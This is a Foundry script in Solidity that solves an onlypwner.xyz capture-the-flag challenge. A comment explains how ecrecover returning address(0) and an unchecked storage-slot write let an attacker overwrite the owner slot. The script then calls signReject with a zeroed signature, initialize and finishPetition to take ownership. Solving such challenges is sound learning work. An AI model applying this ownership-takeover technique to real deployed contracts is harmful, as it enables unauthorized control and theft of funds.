pragma solidity 0.8.19;

import {Script} from "forge-std/Script.sol";

interface IPetition {
    function initialize() external;

    function signSupport(Signature calldata signature) external;

    function signReject(Signature calldata signature) external;

    function finishPetition() external;

    function owner() external view returns (address);

    function isFinished() external view returns (bool);

    function supportDigest() external view returns (bytes32);

    function rejectDigest() external view returns (bytes32);

    struct Signature {
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    struct StoragePointer {
        uint256 value;
    }

    event Signed(address indexed signer, bool isSupport);
}

// https://onlypwner.xyz/challenges/6
/*
to complete this challenge, we need to finish the petition, this can only be called by owner.
ecrecover used in signSupport and signReject does not check address(0) check 
writeStatus() gets the slot from signer and writes pointer.value to that exact slot using assembly
hack: we can use address(0) as signer, pass through the ecrecover check and in WriteStatus() write in the slot0 which is the owner slot. WE NEED TO BECOME OWNER TO FINISH THE PETITION and solve this challenge
so we call signReject with address(0) as signer (changes owner to address(0)) and then call initialize() (as owner is address(0) it can pass) and then call finishPetition() to complete the challenge

*/
contract SolvePleaseSignHere is Script {
    function run() external {
        vm.startBroadcast();

        IPetition petition = IPetition(0x78aC353a65d0d0AF48367c0A16eEE0fbBC00aC88);

        IPetition.Signature memory sign = IPetition.Signature(0, bytes32(0), bytes32(0));
        petition.signReject(sign);
        // slot0 / owner = 0
        petition.initialize();
        // attacker is the new owner, can call finishPetition
        petition.finishPetition();

        vm.stopBroadcast();
    }
}
